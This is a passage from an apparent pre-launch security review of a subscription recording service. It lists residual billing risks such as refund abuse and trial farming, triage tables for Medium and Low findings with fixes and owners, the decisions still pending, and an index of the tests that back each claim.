- **A deleted account's trial is not renewed** (`trial_used` keyed hash,
  `src/crypto.ts:63`, `src/db.ts:928`), and a second subscription on one
  account gets no second trial (`src/billing.ts:110`).
- **Deleting an account cannot strand a charge**: Stripe is canceled first and
  the deletion aborts if that fails (`src/account.ts:126-143`).
- PR #46 adds webhook test coverage and terminal-state handling; PR #47 adds
  the rate limits in [rate-limits.md](rate-limits.md) once merged.

**Residual risk.**
- **F-06 (Medium). Refunds ignore use.** `refundUnused` refunds the unused
  share of the period by time (`src/stripe.ts:441-473`). Someone can subscribe
  to Pro ($25), spend the 45 hours in the first days (about $12 of provider
  cost by the HOME-STRETCH model), delete the account, and get about 90% of
  the $25 back with the transcripts and summaries in hand. They can repeat
  with a new Google identity. This needs a decision, not a patch: refund
  time only when use was small, prorate against use, or stop refunding after
  a threshold. (Consumer refund rules in the buyer's jurisdiction may set a
  floor; ask the lawyer.)
- **F-10 (Low). Trial farming.** Every Google account gets a 90 day, five
  hour trial, and a card is always required (`payment_method_collection:
  "always"`, `src/billing.ts:138`) but the same card can start unlimited
  trials on unlimited accounts. Cost per trial is about $1 to $2 at real use,
  bounded by the global ceiling and, once F-01 is fixed, by the meter. Stripe
  Radar's card fingerprint rules or a `payment_method.fingerprint` uniqueness
  check on trial start are the usual answers.
- **F-10b. The friends and family code is a bearer secret.** With
  `allow_promotion_codes: true` (`src/billing.ts:137`) and `redeem=1` giving
  `payment_method_collection: "if_required"` (`:138`), anyone who learns the
  code gets a free subscription with no card. Set a redemption cap and an
  expiry on the Stripe coupon; the code itself is the control. (Sending
  `redeem=1` without a code does not bypass payment: without a trial the
  first invoice is due at once.)
- **F-12 (Low). `SESSION_SECRET` rotation quietly changes billing.**
  `trialHash` derives its key from `SESSION_SECRET` (`src/crypto.ts:63`), so
  after a rotation no old `trial_used` row matches and every deleted-account
  identity can take a new trial. Rotating that secret is the documented
  response to a session leak (threat-model.md, "Leaked secrets"), so an
  incident would also reopen this. Give `trialHash` its own secret.
- The allowance row "outlives a cancellation Stripe never delivers" is already
  listed under known gaps in threat-model.md; PR #46's reconcile work addresses
  it.

**Severity.** Medium (F-06); Low otherwise.

---

## Triage of every Medium

Blocking items were F-01 (fixed by PR #51) and F-02. Each Medium below has a decision.

| ID | Decision | Why | Proposed fix | Owner |
|---|---|---|---|---|
| F-03 sessions cannot be revoked; no `__Host-` prefix | **Done: `__Host-` rename in PR #48, `session_version` in PR #55** (was: fix before launch if time allows; else accept) | A copied cookie is good for 30 days. "Sign out every Mac" gives the impression of a full reset and is not one. Needs a stolen cookie (malware or an XSS), so it stacks on other failures | Add `token_version` to the session cookie (`{a,t,v}`) and compare in `sessionMiddleware`; old cookies without `v` count as 0. Then "sign out everywhere" really is. Do the `__Host-` rename in the same change, since both sign everyone out once | Liam |
| F-04 device-code phishing | **Partly fixed 2026-10-02** (was: accept for 0.6.0, fix soon). The approval page now says how long ago the Mac asked and always warns that a link or code someone sent must be closed, since approving lets their Mac record into the account and file to its Drive. Still open: the requesting address's country beside the approver's, which means keeping that country with the pending code and so a line on the privacy page first; and an email when a Mac is added | The code is typed or pasted by the victim, the page names the Mac, and approval is rate limited. But `verification_uri_complete` prefills the code and the name is attacker text, so a single click enrolls an attacker's Mac | Drop the prefill on the approval page or require typing it; show "Only continue if you started this on your Mac right now" and the requesting address's country; consider an email when a Mac is added | Liam |
| F-05 session is remote control; hijacked relay sees what the owner types | **Accept (by design)** | The relayed panel is the product. Compensated by F-02's fix and the Mac-side viewer check | Set `PANEL_ORIGIN` (F-02); consider a second confirmation for `/api/record/start` over the relay and never asking for API keys on a relayed Setup page | Liam and Trace |
| F-06 refund ignores use | **Decide before the first paid month ends** | It costs money only after real money is taken, not at launch | Refund by use: subtract provider cost of the used share, or refund only when less than some fraction of the allowance is used | Liam, lawyer |
| F-07 deploy path | **Fix before launch (settings, no code)** | Anyone with write access can dispatch Deploy from a branch: the `production` environment has no protection rules and no branch policy. Branch protection requires the two checks but not reviews. Secret scanning and push protection are off on a public repo. Actions are pinned by tag (F-19) | Give `production` a deployment branch policy of `main` and a required reviewer; turn on secret scanning with push protection and Dependabot alerts; require one review on `main`, or accept that two owners can merge their own PRs; pin actions by SHA | Liam |
| F-08 DRIVE_KEY runbook gap | **Done: doc fixed here, tool built in PR #54** (was: build the tool only if the branch is ever needed) | The "key and database both leaked" branch tells the operator to revoke every grant at Google, and no code path does that in bulk | See [drive-key-rotation.md](drive-key-rotation.md) and [bulk-revoke.md](bulk-revoke.md) | Liam |

## Triage of every Low

Written 2026-10-02 against `main` at `23b19f8`. F-09 and F-14 are fixed (see
the status table above). Each remaining Low has a proposed decision; the
owners confirm or change it before launch. "Code" means a change in this repo;
"Settings" means a dashboard or GitHub change.

| ID | Status on `main` today | Proposed decision | What closes it | Owner |
|---|---|---|---|---|
| F-10 trial farming | Open. No card fingerprint check anywhere in `src/` | **Accept for launch**, bounded by the global ceiling and the meter (about $1 to $2 a farmed trial) | Settings: a Stripe Radar rule that blocks a trial on a card fingerprint already used for one. Code, later: check `payment_method.fingerprint` at trial start | Trace |
| F-10b the 100% off code is a bearer secret | Open. `allow_promotion_codes: true` and `redeem=1` still skip the card | **Fix at the live swap (settings)** | Create the live promotion code with a redemption cap and an expiry, and send it only to named people | Trace |
| F-11 Drive consent not bound to the account | **Done 2026-10-02**: the Drive flow cookie names the account that started it, and `finishConnect` refuses with 409, before calling Google, when another account is signed in. A different Google identity may still attach its Drive, as before; that stays the owners' call | Fixed | | Liam |
| F-12 `SESSION_SECRET` rotation reopens trials | Open. `trialHash` in `src/crypto.ts` derives from `SESSION_SECRET` | **Accept for launch, fix before the first rotation** | Code plus one secret: a `TRIAL_SECRET` that falls back to `SESSION_SECRET`, set to the current `SESSION_SECRET` value so no `trial_used` row changes. Until then, the leaked-secret runbook notes that a rotation resets the repeat-trial block | Liam |
| F-13 `DRIVE_KEY` hashed, not stretched | Open. `src/crypto.ts` imports `SHA-256(secret)` as the AES key | **Accept**: stretching only matters for a guessable secret, and this one is generated | Process: generate `DRIVE_KEY` with `openssl rand -base64 48`, as drive-key-rotation.md already says. Code, optional: refuse to start on a key under 32 characters | Liam |
| F-15 relayed `Location`, relayed pages without CSP | Partly fixed. Relayed pages now carry the panel's own nonce CSP (PR #49), and the panel host adds `PANEL_CSP` on top (`src/panel-host.ts`). On the account host, which is where the relay runs while `PANEL_ORIGIN` is empty, the Worker adds no policy of its own, so the only one is written by whoever holds the device token. `location` is still passed through (`src/panel-relay.ts`) | **Follows F-02**: setting `PANEL_ORIGIN` closes the CSP half. Accept the `Location` half | Code, optional: rewrite or drop a relayed `Location` that leaves the panel's own path | Liam |
| F-16 a stalled assistant stream outlives its 900 s reservation | **Done 2026-10-02**: `relayStream` ends a provider stream that goes quiet for 2 minutes or runs past 10, as a failure, which is settled at the estimate it was held at. Both are inside the 15-minute sweep, so the reservation is always still there to settle (`test/assistant-stream.test.ts`) | Fixed | | Liam |
| F-17 device code lives 15 minutes, ASVS 2.7.2 says 10 | **Done 2026-10-02**: `CODE_SECONDS = 600` in `src/devices.ts`. The Mac reads `expires_in`, so it needs no change | Fixed | | Liam |
| F-18 one script can lock a shared address out of sign-in | Open by design. `login` and `callback` allow 600 per 10 minutes per address, sized for a lecture hall behind one NAT (rate-limits.md) | **Accept**: per-account, per-device, global and money ceilings do not depend on the address | Watch for 429s on `/login` in the first week; raise the per-address limits if a campus hits them | Liam |
| F-19 Actions pinned by tag, not commit | **Done 2026-10-02**: every action in both repos is pinned to the commit its tag pointed at (checkout v4.4.0, setup-node v4.4.0, setup-python v5.6.0, upload-artifact v4.6.2), the release in a comment | Fixed | | Liam |
| F-20 JSON answers carry no `Cache-Control: no-store` | **Done 2026-10-02**: `src/headers.ts` adds `no-store` to JSON as well as HTML, unless a handler set its own `Cache-Control` | Fixed | | Liam |

## Decisions needed from Liam

1. **F-01 (done, PR #51):** ship the floor (`bytes / 24000`) as a same-day patch, then the
   provider-reported settle? Or hold launch until the settle is done?
2. **F-02:** set `PANEL_ORIGIN` before 0.6.0 (needs a second domain and a
   Cloudflare custom domain), or accept the risk in writing?
3. **F-03 (done, PR #48 and PR #55):** do the session-version change and the `__Host-` rename now, in one
   sign-out-everyone deploy?
4. **F-06:** refund policy for deleted accounts that used their allowance.
5. **F-07:** turn on the GitHub settings above. They are dashboard clicks.
6. **The Lows:** confirm or change each proposed decision in "Triage of
   every Low" above.

## Evidence index

| Claim | Where it is shown |
|---|---|
| Rate limits on open and semi-open routes | `src/limits.ts`, `test/security.test.ts` "rate limits on the routes that answer strangers", `test/attacks.test.ts`; full table in `docs/rate-limits.md` (PR #47) |
| Cross-account isolation | `test/isolation.test.ts` (PR #42) |
| Concurrent spend and the global ceiling | `test/spend-limits.test.ts` (PR #43), `test/proxy.test.ts` |
| Stripe webhook behavior | `test/stripe.test.ts`; `test/stripe-webhook.test.ts` (PR #46) |
| CSRF verdict per route | PR #48 (`test/csrf.test.ts`, section "CSRF audit" appended to `threat-model.md`) |
| Panel host, tickets, cookies | `test/panel-host.test.ts` (PR #41) |
| Token expiry and revocation | `test/expiry.test.ts`, `test/devices.test.ts` |
| Drive key rotation and its runbook | `test/security.test.ts` "rotating DRIVE_KEY", `test/threat-model-claims.test.ts` "the DRIVE_KEY runbook" |
| F-01 | `test/meter-floor.test.ts`, `test/threat-model-claims.test.ts` "the transcription meter" |
| F-03 | `test/session-version.test.ts`, `test/session-cookie.test.ts` |
| F-08 | `test/bulk-revoke.test.ts`, [bulk-revoke.md](bulk-revoke.md) |
| F-09 | `test/untrusted-transcript.test.ts` |
| Dependencies | `npm audit` reported 0 vulnerabilities on 2026-09-29 (registry query only) |
